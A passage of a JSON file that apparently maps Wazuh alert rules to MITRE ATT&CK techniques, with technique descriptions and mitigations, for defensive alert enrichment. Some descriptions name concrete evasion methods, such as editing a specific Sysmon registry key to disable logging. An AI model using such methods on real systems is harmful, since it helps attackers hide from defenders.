[
    {
        "rule_id": 504,
        "rule_description": "Wazuh agent disconnected.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 505,
        "rule_description": "Wazuh agent removed.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 506,
        "rule_description": "Wazuh agent stopped.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 518,
        "rule_description": "Windows Adware/Spyware application found.",
        "mitre_id": [
            "T1072"
        ],
        "possible_attacks": [
            "Software Deployment Tools"
        ],
        "description": [
            "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command]( on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. Such services may also utilize [Web Protocols]( to communicate back to adversary owned infrastructure.\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality."
        ],
        "mitigation_strategies": [
            "Have a strict approval policy for use of deployment systems."
        ]
    },
    {
        "rule_id": 521,
        "rule_description": "Possible kernel level rootkit",
        "mitre_id": [
            "T1014"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 550,
        "rule_description": "Integrity checksum changed.",
        "mitre_id": [
            "T1565.001"
        ],
        "possible_attacks": [
            "Stored Data Manipulation"
        ],
        "description": [
            "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."
        ]
    },
    {
        "rule_id": 553,
        "rule_description": "File deleted.",
        "mitre_id": [
            "T1070.004",
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 592,
        "rule_description": "Log file size reduced.",
        "mitre_id": [
            "T1565.001"
        ],
        "possible_attacks": [
            "Stored Data Manipulation"
        ],
        "description": [
            "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."
        ]
    },
    {
        "rule_id": 593,
        "rule_description": "Microsoft Event log cleared.",
        "mitre_id": [
            "T1070"
        ],
        "possible_attacks": [
            "Indicator Removal"
        ],
        "description": [
            "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
        ],
        "mitigation_strategies": [
            "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."
        ]
    },
    {
        "rule_id": 594,
        "rule_description": "Registry Key Integrity Checksum Changed",
        "mitre_id": [
            "T1565.001",
            "T1112"
        ],
        "possible_attacks": [
            "Stored Data Manipulation",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk.",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 597,
        "rule_description": "Registry Key Entry Deleted.",
        "mitre_id": [
            "T1070.004",
            "T1485",
            "T1112"
        ],
        "possible_attacks": [
            "Data Destruction",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. ",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 598,
        "rule_description": "Registry Key Entry Added to the System",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 750,
        "rule_description": "Registry Value Integrity Checksum Changed",
        "mitre_id": [
            "T1565.001",
            "T1112"
        ],
        "possible_attacks": [
            "Stored Data Manipulation",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk.",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 751,
        "rule_description": "Registry Value Entry Deleted.",
        "mitre_id": [
            "T1070.004",
            "T1485",
            "T1112"
        ],
        "possible_attacks": [
            "Data Destruction",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. ",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 752,
        "rule_description": "Registry Value Entry Added to the System",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 428,
        "rule_description": "Wazuh API: Warning event - IP: $(srcip) blocked due to exceeded loging attemps.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 3102,
        "rule_description": "sendmail: Sender domain does not have any valid",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3103,
        "rule_description": "sendmail: Rejected by access list",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3104,
        "rule_description": "sendmail: Attempt to use mail server as relay",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3105,
        "rule_description": "sendmail: Sender domain is not found",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3106,
        "rule_description": "sendmail: Sender address does not have domain",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3108,
        "rule_description": "sendmail: Sendmail rejected due to pre-greeting.",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3151,
        "rule_description": "sendmail: Sender domain has bogus MX record.",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3152,
        "rule_description": "sendmail: Multiple attempts to send e-mail from a",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
